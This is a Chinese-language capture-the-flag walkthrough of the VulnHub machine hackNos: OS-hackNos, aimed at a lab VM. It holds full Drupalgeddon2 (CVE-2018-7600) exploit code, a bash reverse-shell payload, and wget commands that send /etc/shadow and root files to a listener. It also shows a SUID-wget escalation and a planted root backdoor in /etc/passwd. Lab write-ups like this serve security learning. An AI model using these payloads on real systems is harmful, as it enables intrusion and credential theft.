# HACKNOS: OS-HACKNOS

2025.02.16 https://www.vulnhub.com/entry/hacknos-os-hacknos,401/

[video](https://www.bilibili.com/video/BV1DqA5eREJF/?spm_id_from=333.1387.homepage.video_card.click&vd_source=aed2f374c732513d2e535afafb1fd2ec)

## Ip

192.168.5.40

## Scan

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

先看 80 web，首页源码无隐藏内容，gobuster 目录扫描发现：

```
http://192.168.5.40/drupal               (Status: 301) [Size: 313] [--> http://192.168.5.40/drupal/]
http://192.168.5.40/alexander.txt        (Status: 200) [Size: 393]
```

访问 http://192.168.5.40/alexander.txt base64 转码 ：

```
KysrKysgKysrKysgWy0+KysgKysrKysgKysrPF0gPisrKysgKysuLS0gLS0tLS0gLS0uPCsgKytbLT4gKysrPF0gPisrKy4KLS0tLS0gLS0tLjwgKysrWy0gPisrKzwgXT4rKysgKysuPCsgKysrKysgK1stPi0gLS0tLS0gLTxdPi0gLS0tLS0gLS0uPCsKKytbLT4gKysrPF0gPisrKysgKy48KysgKysrWy0gPisrKysgKzxdPi4gKysuKysgKysrKysgKy4tLS0gLS0tLjwgKysrWy0KPisrKzwgXT4rKysgKy48KysgKysrKysgWy0+LS0gLS0tLS0gPF0+LS4gPCsrK1sgLT4tLS0gPF0+LS0gLS4rLi0gLS0tLisKKysuPA==

+++++ +++++ [->++ +++++ +++<] >++++ ++.-- ----- --.<+ ++[-> +++<] >+++.
----- ---.< +++[- >+++< ]>+++ ++.<+ +++++ +[->- ----- -<]>- ----- --.<+
++[-> +++<] >++++ +.<++ +++[- >++++ +<]>. ++.++ +++++ +.--- ---.< +++[-
>+++< ]>+++ +.<++ +++++ [->-- ----- <]>-. <+++[ ->--- <]>-- -.+.- ---.+
++.<
```

是一个 Brainfuck 编码，解密后内容为 james:Hacker@4514 尝试用此凭据 ssh 登陆，密码不对。

在看 http://192.168.5.40/drupal 这个 cms，使用上面得到的凭据登陆系统，版本为 Drupal 7，有可以直接的漏洞利用，https://github.com/firefart/CVE-2018-7600/blob/master/poc.py 使用这个 exp：

```python
import requests
import re

HOST="http://192.168.5.40/drupal/"

get_params = {'q':'user/password', 'name[#post_render][]':'passthru', 'name[#markup]':'id', 'name[#type]':'markup'}
post_params = {'form_id':'user_pass', '_triggering_element_name':'name'}
r = requests.post(HOST, data=post_params, params=get_params)
print(r.text)
m = re.search(r'<input type="hidden" name="form_build_id" value="([^"]+)" />', r.text)
if m:
    found = m.group(1)
    get_params = {'q':'file/ajax/name/#value/' + found}
    post_params = {'form_build_id':found}
    r = requests.post(HOST, data=post_params, params=get_params)
    print(r.text)
```

执行后，可以看到 www-data 的输出，直接反弹 shell：

```
get_params = {'q':'user/password', 'name[#post_render][]':'passthru', 'name[#markup]':'/bin/bash -c "/bin/bash -i >& /dev/tcp/192.168.5.3/8888 0>&1"', 'name[#type]':'markup'}
```

得到反弹的连接后，先的到了第一个 flag：

```
www-data@hackNos:/home/james$ cat user.txt
   _
  | |
 / __) ______  _   _  ___   ___  _ __
 \__ \|______|| | | |/ __| / _ \| '__|
 (   /        | |_| |\__ \|  __/| |
  |_|          \__,_||___/ \___||_|



MD5-HASH : bae11ce4f67af91fa58576c1da2aad4b
```

发现 cms 数据库的配置文件：

```
www-data@hackNos:/var/www/html/drupal$ cat /var/www/html/drupal/sites/default/settings.php

$databases = array (
  'default' =>
  array (
    'default' =>
    array (
      'database' => 'cuppa',
      'username' => 'cuppauser',
      'password' => 'Akrn@4514',
      'host' => 'localhost',
      'port' => '',
      'driver' => 'mysql',
      'prefix' => '',
    ),
  ),
);
```

进行系统枚举，发现 suid 程序 wget，尝试用 GTFOBin 中的方法，但是提示没有 --use-askpass 这个参数，应该是版本太老了：

```
TF=$(mktemp);chmod +x $TF;echo -e '#!/bin/sh\n/bin/sh -p 1>&0' >$TF;/usr/bin/wget --use-askpass=$TF 0
```

使用另外一种方式，wget 读取 root 用户文件，然后传输到 kali 上：

```
# kali 上监听8888
nc -lvnp 8888

# 目标机器上执行
wget --post-file=/etc/shadow 192.168.5.3:8888
```

这时在 kali 上得到了 shadow 文件：

```
root:$6$ii3GEj5H$DHrrLj9Q9Bpux.aVR9fy1e240PyBPSI/yh5WGRUyN7TN7Ulb5rFO0CoAVRY8UYvdxhgw142tkmgyqubP4l1ta0:18216:0:99999:7:::
james:$6$ImB2eoJe$bnE3xrR1mBD1WtBjccl2Nh74wqDqJtMklx1lTEJyouewzdWRICla32oHXz9YNq0hImAoCSkM2tRyvQhxEuO9e.:18216:0:99999:7:::
```

rockyou 尝试破解没戏。

同时也可以直接读 wget --post-file=/root/root.txt 192.168.5.3:8888 得到最后的 root flag：

```
    _  _                              _
  _| || |_                           | |
 |_  __  _|______  _ __  ___    ___  | |_
  _| || |_|______|| '__|/ _ \  / _ \ | __|
 |_  __  _|       | |  | (_) || (_) || |_
   |_||_|         |_|   \___/  \___/  \__|



MD5-HASH : bae11ce4f67af91fa58576c1da2aad4b

Author : Rahul Gehlaut

Linkedin : https://www.linkedin.com/in/rahulgehlaut/

Blog : www.hackNos.com
```

另外一种提权到 root 的思路，wget 直接覆盖/etc/passwd 文件，在 kali 上将添加过后门用户的 passwd 写入到目标机器上：

```
openssl passwd -1 -salt new 456
$1$new$DEG4GSAwR8rsoc/FNKp0Q1

admin:$1$new$DEG4GSAwR8rsoc/FNKp0Q1:0:0:root:/root:/bin/bash
```

先读取目标机器上的 passwd 文件，将 `admin:$1$new$DEG4GSAwR8rsoc/FNKp0Q1:0:0:root:/root:/bin/bash` 添加到最后一行，在 kali 上创建 http，然后在目录机器上执行下面命令：

```
cd /etc
wget -O passwd http://192.168.5.3/z/passwd

su admin # 输入密码456
```

最终也得到了 root 权限：

```
root@hackNos:~# cat root.txt
    _  _                              _
  _| || |_                           | |
 |_  __  _|______  _ __  ___    ___  | |_
  _| || |_|______|| '__|/ _ \  / _ \ | __|
 |_  __  _|       | |  | (_) || (_) || |_
   |_||_|         |_|   \___/  \___/  \__|



MD5-HASH : bae11ce4f67af91fa58576c1da2aad4b

Author : Rahul Gehlaut

Linkedin : https://www.linkedin.com/in/rahulgehlaut/

Blog : www.hackNos.com
```
